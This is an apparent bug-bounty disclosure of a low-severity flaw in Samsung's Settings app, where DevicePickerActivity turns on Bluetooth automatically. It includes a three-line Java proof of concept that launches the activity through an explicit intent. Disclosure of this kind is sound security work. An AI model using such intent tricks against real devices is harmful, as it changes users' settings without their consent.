# Details

<table>
    <tr>
        <td>Name</td>
        <td>Settings</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.android.settings</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.12</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2023.01.04</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$200</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/108.%20Settings%20—%20Enabling%20Bluetooth%20via%20DevicePickerActivity/Oversecured_report.png)

In the Settings app, patched by Samsung, in the file `com/android/settings/bluetooth/DevicePickerActivity.java` Samsung added automatic enabling of Bluetooth.

**Proof of Concept**

```java
Intent i = new Intent("");
i.setClassName("com.android.settings", "com.android.settings.bluetooth.DevicePickerActivity");
startActivity(i);
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)
